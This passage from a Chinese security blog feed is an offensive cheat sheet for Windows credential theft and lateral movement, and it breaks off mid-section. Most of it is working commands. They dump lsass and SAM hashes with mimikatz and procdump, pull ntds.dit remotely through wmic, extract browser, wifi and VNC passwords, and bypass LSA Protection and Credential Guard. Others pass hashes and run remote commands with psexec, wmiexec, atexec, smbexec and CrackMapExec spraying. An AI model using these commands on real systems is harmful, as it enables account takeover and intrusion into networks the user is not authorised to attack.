域中的所</span><br><span class="line">有组</span><br><span class="line">psloggedon.exe</span><br><span class="line">netsess.exe</span><br><span class="line">&#x2F;&#x2F;192.168.1.115</span><br><span class="line">&#x2F;&#x2F;查询那台主机和用户登录到该主机上</span><br><span class="line">&#x2F;&#x2F;远程主机上无需管理员权限,查询到主机名和</span><br><span class="line">用户</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL</span><br><span class="line">SERVERCLIENT\DEFAULT&quot; &#x2F;&#x2F;获取最近mstsc登录的记录</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="6-DOS常用快捷命令"><a href="#6-DOS常用快捷命令" class="headerlink" title="6.DOS常用快捷命令"></a>6.DOS常用快捷命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mspaint</span><br><span class="line">calc</span><br><span class="line">画图工具</span><br><span class="line">计算器</span><br><span class="line">notepad 记事本</span><br><span class="line">taskmgr 任务管理器osk</span><br><span class="line">打开屏幕键盘</span><br><span class="line">gpedit.msc</span><br><span class="line">组策略</span><br><span class="line">services.msc</span><br><span class="line">本地服务</span><br><span class="line">compmgmt.msc</span><br><span class="line">devmgmt.msc</span><br><span class="line">winver</span><br><span class="line">magnify</span><br><span class="line">eventvwr</span><br><span class="line">计算机管理</span><br><span class="line">设备管理器</span><br><span class="line">查看系统版本</span><br><span class="line">放大镜实用程序</span><br><span class="line">事件查看器</span><br><span class="line">Regedit 打开注册表</span><br><span class="line">resmon 资源监视器</span><br><span class="line">WMIC BIOS get releasedate</span><br><span class="line">mstsc -f</span><br><span class="line">查看电脑生产日期</span><br><span class="line">远程连接(可以全屏)</span><br><span class="line">echo %COMSPEC%%</span><br><span class="line">fsutil fsinfo drives</span><br><span class="line">当前cmd环境变量</span><br><span class="line">列出所有驱动器名</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-凭据获取+横向渗透</title>
      <link href="2021/06/22/nei-wang-shen-tou-ping-ju-huo-qu-heng-xiang-shen-tou/"/>
      <url>2021/06/22/nei-wang-shen-tou-ping-ju-huo-qu-heng-xiang-shen-tou/</url>
      
        <content type="html"><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">收集用户明文密码以及Hash</span><br><span class="line">横向常用工具</span><br><span class="line">收集第三方密码及Hash</span><br><span class="line">传统键盘记录</span><br><span class="line">Bypass List</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="收集用户明文密码及Hash"><a href="#收集用户明文密码及Hash" class="headerlink" title="收集用户明文密码及Hash"></a>收集用户明文密码及Hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在线拖Hash姿势</span><br><span class="line">离线拖Hash姿势</span><br><span class="line">Bypass XXX List</span><br><span class="line">net-NTLM Hash利用</span><br><span class="line">Linux Hash</span><br><span class="line">域Hash拖取姿势</span><br><span class="line">Hash破解姿势</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="在线拖Hash姿势"><a href="#在线拖Hash姿势" class="headerlink" title="在线拖Hash姿势"></a>在线拖Hash姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、SAM</span><br><span class="line">(1) mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line">(2) ps1</span><br><span class="line">Invoke-PowerDump.ps1</span><br><span class="line">2、lsass.exe</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="离线拖Hash姿势"><a href="#离线拖Hash姿势" class="headerlink" title="离线拖Hash姿势"></a>离线拖Hash姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.SAM</span><br><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br><span class="line">NinjaCopy</span><br><span class="line">2.lsass.exe</span><br><span class="line">procdump.exe -accepteula (-54) -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;comsvcs.dll</span><br><span class="line">见comsvcs.vbs</span><br><span class="line">Outflank-Dumpert</span><br><span class="line">Outflank-Dumpert.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="提取lsass-exe-Tips"><a href="#提取lsass-exe-Tips" class="headerlink" title="提取lsass.exe Tips"></a>提取lsass.exe Tips</h5><p>开启Wdigest Auth</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v</span><br><span class="line">UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">Set-ItemProperty -Path</span><br><span class="line">HKLM:\SYSTEM\CurrentCzontrolSet\Control\SecurityProviders\WDigest -Name</span><br><span class="line">UseLogonCredential -Type DWORD -Value 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Bypass-LSA-Protection"><a href="#Bypass-LSA-Protection" class="headerlink" title="Bypass LSA Protection"></a>Bypass LSA Protection</h5><p><img src="/images/pasted-55.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">防止对 lsass.exe 注入</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">Bypass (1)</span><br><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">Bypass (2)</span><br><span class="line">privilege::debug</span><br><span class="line">token::whoami</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Bypass-KB2871997"><a href="#Bypass-KB2871997" class="headerlink" title="Bypass KB2871997"></a>Bypass KB2871997</h5><p>WDigest SSP</p><h5 id="Bypass-Restricted-Administrator-Mode"><a href="#Bypass-Restricted-Administrator-Mode" class="headerlink" title="Bypass Restricted Administrator Mode"></a>Bypass Restricted Administrator Mode</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bypass (1)</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:remoteserver</span><br><span class="line">&#x2F;ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;&#x2F;run:mstsc.exe &#x2F;restictedadmin&quot;</span><br><span class="line">Bypass (2)</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;p:test123! &#x2F;v:192.168.62.136 &#x2F;cert-ignore</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;pth:d25ecd13fddbb542d2e16da4f9e0333d &#x2F;v:192.168.62.136 &#x2F;cert-</span><br><span class="line">ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Bypass-Credential-Guard"><a href="#Bypass-Credential-Guard" class="headerlink" title="Bypass Credential Guard"></a>Bypass Credential Guard</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows 10和Windows Server 2016启用</span><br><span class="line">Bypass (1)</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">Bypass (2): memssp</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line">Bypass (3) : NetNTLM Downgrade Attack</span><br><span class="line">InternalMonologue.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Bypass-LAPS"><a href="#Bypass-LAPS" class="headerlink" title="Bypass LAPS"></a>Bypass LAPS</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LAPSToolkit</span><br><span class="line">查询由系统管理员指定的用户组,查找具有“全部扩展权限”的用户(可查看密码),而且还可以查看全</span><br><span class="line">部启用了LAPS的计算机设备</span><br><span class="line">ms-MCS-AdmPwd &#x2F;&#x2F;存储密码</span><br><span class="line">ms-MCS-AdmPwdExpiration Time &#x2F;&#x2F;存储过期时间</span><br><span class="line">Get-LAPSComputers &#x2F;&#x2F;显示所有启用了LAPS,密码有效期和密码(如果用户有权访问)的计算机</span><br><span class="line">Find-LAPSDelegatedGroups &#x2F;&#x2F;搜素所有OU,以查看哪些AD组可以读取ms-Mcs-AdmPwd属性</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Shadow"><a href="#Shadow" class="headerlink" title="Shadow"></a>Shadow</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;shadow$id$salt@encrypted</span><br><span class="line">root:$6$LlczSMShZXNDgc&#x2F;E$VTBWqUeNCcMw5c0hlTsqXSiUSGYKv9xiusrG71Trs&#x2F;&#x2F;6mqh.vcOpUbS</span><br><span class="line">Yw9CwOQn2dkQrkHI2Z.xCu2d4Q5ur6&#x2F;:18251:0:99999:7:::</span><br><span class="line">id为1时,采用md5算法加密</span><br><span class="line">id为5时,采用SHA256算法加密</span><br><span class="line">id为6时,采用SHA512算法加密</span><br><span class="line">破解</span><br><span class="line">.&#x2F;unshadow &#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow &gt; password.txt</span><br><span class="line">.&#x2F;john password.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="域Hash拖取姿势"><a href="#域Hash拖取姿势" class="headerlink" title="域Hash拖取姿势"></a>域Hash拖取姿势</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">获取ntds.dit</span><br><span class="line">1、Volume Shadow Copy</span><br><span class="line">ntdsutil</span><br><span class="line">vssadmin</span><br><span class="line">vshadow.exe</span><br><span class="line">vssown.vbs</span><br><span class="line">2、Invoke-NinjaCopy.ps1</span><br><span class="line">解析ntds.dit</span><br><span class="line">mimikatz (Dcsync&amp;inject lsass)</span><br><span class="line">一键拖Hash (vshadow.exe)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="域Hash拖取姿势-1"><a href="#域Hash拖取姿势-1" class="headerlink" title="域Hash拖取姿势"></a>域Hash拖取姿势</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取ntds.dit2、Invoke-NinjaCopy.ps1</span><br><span class="line">原理</span><br><span class="line">Bypass SACL</span><br><span class="line">Bypass Open Run File</span><br><span class="line">Bypass DACL</span><br><span class="line">操作</span><br><span class="line">import-module Invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path &quot;c:\Windows\ntds\ntds.dit&quot; -LocalDestination &quot;c:\ntds.dit&quot;</span><br><span class="line">esentutl &#x2F;p &#x2F;o ntds.dit</span><br><span class="line">Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;RDLABDC02&quot;</span><br><span class="line">LocalDestination &quot;c:\temp\ntds.dit&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="域Hash拖取姿势-一键导出"><a href="#域Hash拖取姿势-一键导出" class="headerlink" title="域Hash拖取姿势 - 一键导出"></a>域Hash拖取姿势 - 一键导出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe+QuarksPwDump.exe</span><br><span class="line">注:修改WORK_PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="域Hash拖取姿势-Tips"><a href="#域Hash拖取姿势-Tips" class="headerlink" title="域Hash拖取姿势 - Tips"></a>域Hash拖取姿势 - Tips</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">远程导出</span><br><span class="line">wmic &#x2F;node:AD &#x2F;user:PENTEST\Administrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c vssadmin create shadow &#x2F;for&#x3D;c: 2&gt;&amp;1 &gt; c:&#x2F;vss.log&quot;wmic &#x2F;node:AD &#x2F;user:PENTEST\administrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c copy VSS ID&#x2F;Windows&#x2F;NTDS&#x2F;NTDS.dit C:&#x2F;windows&#x2F;temp&#x2F;NTDS.dit 2&gt;&amp;1&quot;</span><br><span class="line">wmic &#x2F;node:AD &#x2F;user:PENTESTadministrator &#x2F;password:Aa123456@ process call create</span><br><span class="line">&quot;cmd &#x2F;c copy VSS ID&#x2F;Windows&#x2F;System32&#x2F;config&#x2F;SYSTEM c:&#x2F;windows&#x2F;temp&#x2F;SYSTEM.hive</span><br><span class="line">2&gt;&amp;1&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="域Hash拖取姿势-Misc"><a href="#域Hash拖取姿势-Misc" class="headerlink" title="域Hash拖取姿势 - Misc"></a>域Hash拖取姿势 - Misc</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf</span><br><span class="line">windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump</span><br><span class="line">auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrab</span><br><span class="line">Empire</span><br><span class="line">usemodule credentials&#x2F;mimikatz&#x2F;dcsync_hashdump</span><br><span class="line">Nishang</span><br><span class="line">Copy-VSS.ps1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="收集第三方密码及Hash"><a href="#收集第三方密码及Hash" class="headerlink" title="收集第三方密码及Hash"></a>收集第三方密码及Hash</h5><ul><li>收集用户配置中收集明文密码</li><li>从用户数据库中收集保存密码</li><li>抓取常用软件明文密码</li></ul><h5 id="抓取常用软件明文密码"><a href="#抓取常用软件明文密码" class="headerlink" title="抓取常用软件明文密码"></a>抓取常用软件明文密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chrome等浏览器</span><br><span class="line">Navicat</span><br><span class="line">FTP</span><br><span class="line">Outlook</span><br><span class="line">SVN</span><br><span class="line">WIFI</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="收集密码"><a href="#收集密码" class="headerlink" title="收集密码"></a>收集密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">RDP</span><br><span class="line">cmdkey &#x2F;list</span><br><span class="line">wifi</span><br><span class="line">netsh wlan export profile interface&#x3D;无线网络连接 key&#x3D;clear folder&#x3D;C:\</span><br><span class="line">Chrome</span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome</span><br><span class="line">&#x2F;in:\&quot;%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data1\&quot;</span><br><span class="line">&#x2F;unprotect&quot; exit</span><br><span class="line">RealVNC</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="收集密码-Tools-List-1"><a href="#收集密码-Tools-List-1" class="headerlink" title="收集密码 Tools List(1)"></a>收集密码 Tools List(1)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">系统</span><br><span class="line">mimikatz</span><br><span class="line">wce</span><br><span class="line">getpass</span><br><span class="line">pwdump7</span><br><span class="line">QuarksPwDump</span><br><span class="line">三方</span><br><span class="line">mimikittenz</span><br><span class="line">netpass.exe</span><br><span class="line">Dialupass.exe</span><br><span class="line">LaZagne</span><br><span class="line">passrec工具包</span><br></pre></td></tr></table></figure><h5 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a>KB2871997</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-113(NT AUTHORITY Local account)</span><br><span class="line">S-1-5-114(NT AUTHORITY Administrators 用户组的本地账户和成员)</span><br><span class="line">可以通过组策略使用这些 sid 来有效地阻止远程登录使用所有本地管理账户</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="PTX分类"><a href="#PTX分类" class="headerlink" title="PTX分类"></a>PTX分类</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PTH:抓取哈希值并用来访问资源。直到用户改密码哈希值都是有效的。</span><br><span class="line">PTT:抓取Kerberos票据用来访问资源。在票据有效期期限内票据都有效(一般是7天)。</span><br><span class="line">PTK:抓取AES Key访问资源。</span><br><span class="line">Tips:</span><br><span class="line">如果获得哈希值的类型是NTLM,Kerberos票据的类型是RC4.如果哈希类型是AES,Kerberos票</span><br><span class="line">据类型也是ABS。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h5><p>LSALogonUser API</p><h6 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h6><p>privilege::debug<br>sekurlsa::logonpasswords</p><h6 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup</span><br><span class="line">&#x2F;ntlm:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">注:受UAC影响,远程网络验证只能使用SID 500本地管理员用户</span><br><span class="line">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterP</span><br><span class="line">olicy 1PTH</span><br><span class="line">注:默认10小时可以用来登录</span><br><span class="line">基本用法</span><br><span class="line">导出内存中Ticket</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br><span class="line">导入Ticket</span><br><span class="line">kerberos::ptt</span><br><span class="line">C:\test[0;2d87a]-2-0-40e00000-a@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line">攻击方法</span><br><span class="line">MS14-068(kekeo、ms14-068.exe)</span><br><span class="line">Golden ticket</span><br><span class="line">SILVER ticket</span><br><span class="line">ipc连接</span><br><span class="line">net use \\ip\c$ &quot;password&quot; &#x2F;user:domain\username</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h5><p>要求</p><ul><li>1.SMB服务必须开启</li><li>2.文件的打印机共享必须开启</li><li>3.admin$必须可以访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\ip -accepteula -u username -p password program.exe</span><br><span class="line">PsExec.exe \\192.168.1.6 -u administrator -p Abcd1234 -s cmd.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WMIEXEC-Tools-List"><a href="#WMIEXEC-Tools-List" class="headerlink" title="WMIEXEC Tools List"></a>WMIEXEC Tools List</h5><ul><li>Invoke-TheHash.pad1</li><li>wmic</li><li>wmiexec.vbs</li><li>impacket wmiexec.py</li></ul><h5 id="WMIEXEC-1"><a href="#WMIEXEC-1" class="headerlink" title="WMIEXEC (1)"></a>WMIEXEC (1)</h5><ul><li>wmic + type</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;node:DC1 &#x2F;user:DOMAIN\user&#x2F;password:pass process call create &quot;cmd &#x2F;c whoami</span><br><span class="line">&gt;c:\temp\output.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>vbs</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd domain_name username password cmd</span><br><span class="line">cscript.exe wmiexec.vbs &#x2F;cmd WIN-78L42RBHLLO administrator admin123!@# &quot;ipconfig&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>impacket wmiexec.py</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:Aa123456@@192.168.100.190</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>wmiexec.py -hashes</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000:ccef208c6485269c20db2cad21734fe7</span><br><span class="line">workgroup&#x2F;administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Invoke-TheHash</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Module Invoke-TheHash.psd1</span><br><span class="line">Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash</span><br><span class="line">ccef208c6485269c20db2cad21734fe7 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="AT-amp-SchTasks"><a href="#AT-amp-SchTasks" class="headerlink" title="AT&amp;SchTasks"></a>AT&amp;SchTasks</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ATeXEC</span><br><span class="line">python atexec.py administrator:admin123!@#192.168.3.133 ipconfig</span><br><span class="line">schtasks &#x2F;create &#x2F;tn ExampleTask &#x2F;tr c:\windows\system32\calc.exe &#x2F;sc once &#x2F;st 00:00 &#x2F;S</span><br><span class="line">host.domain &#x2F;RU System</span><br><span class="line">schtasks &#x2F;run &#x2F;tn ExampleTask &#x2F;S host.domain</span><br><span class="line">schtasks &#x2F;F &#x2F;delete &#x2F;tn ExampleTask &#x2F;S host.domain</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="CrackMapExec-批量验证"><a href="#CrackMapExec-批量验证" class="headerlink" title="CrackMapExec (批量验证)"></a>CrackMapExec (批量验证)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">apt-get install crackmapexec</span><br><span class="line">批量PTH</span><br><span class="line">crackmapexec 192.168.3.0&#x2F;24 -u administrator -H ccef208c6485269c20db2cad21734fe</span><br><span class="line">CME具有三种不同的命令执行方法:( --exec-method )</span><br><span class="line">1.wmiexec</span><br><span class="line">2.atexec</span><br><span class="line">3.smbexec</span><br><span class="line">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -x whoami</span><br><span class="line">暴力破解 (注意账号锁定)cme smb 192.168.1.101 -u Administrator -p &#x2F;path&#x2F;to&#x2F;passwords.txt</span><br><span class="line">注:cme可完成识别Web Banner、网页截图、端口扫描、枚举用户、会话、共享、磁盘、获取密码及</span><br><span class="line">Hash、获取密码策略等</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="SMBEXEC-DCOMEXEC"><a href="#SMBEXEC-DCOMEXEC" class="headerlink" title="SMBEXEC + DCOMEXEC"></a>SMBEXEC + DCOMEXEC</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SMBEXEC</span><br><span class="line">python smbexec.py -hashes</span><br><span class="line">aad3b435b51404eeaad3b435b51404ee:8f909fdb472d0b85cddb3e36669a9b07</span><br><span 